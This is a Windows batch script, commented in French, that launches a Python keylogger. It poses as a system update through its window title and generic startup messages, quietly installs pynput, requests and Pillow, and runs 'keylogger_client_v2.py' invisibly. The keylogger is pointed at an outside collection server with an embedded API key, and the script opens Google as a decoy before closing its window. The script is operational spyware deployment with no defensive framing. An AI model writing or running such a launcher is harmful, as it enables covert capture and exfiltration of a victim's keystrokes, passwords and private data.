@echo off
:: Lance le keylogger v2 sur Windows
title Mise a jour systeme...

cd /d "%~dp0"

echo ============================================
echo    Demarrage du programme...
echo ============================================
echo.

:: Verifier Python
python --version >nul 2>&1
if errorlevel 1 (
    echo [ERREUR] Python n'est pas installe sur ce PC
    echo.
    echo Telechargez Python depuis: https://www.python.org/downloads/
    echo.
    pause
    exit /b 1
)

:: Creer venv Windows si necessaire
if not exist venv_windows (
    echo Creation environnement Windows...
    python -m venv venv_windows
    venv_windows\Scripts\pip.exe install -q pynput requests Pillow
    echo.
)

:: Lancer en mode invisible (version v2, nouveau serveur + API key)
echo Lancement en cours...
start /B "" venv_windows\Scripts\pythonw.exe keylogger_client_v2.py https://api.keylog.claverie.site 72UsPl9QtgelVRbJ44u-G6hcNiSIWx64MEOWcmcCQ

:: Attendre 2 secondes puis ouvrir navigateur
timeout /t 2 /nobreak >nul
start https://www.google.com

:: Fermer cette fenetre
exit

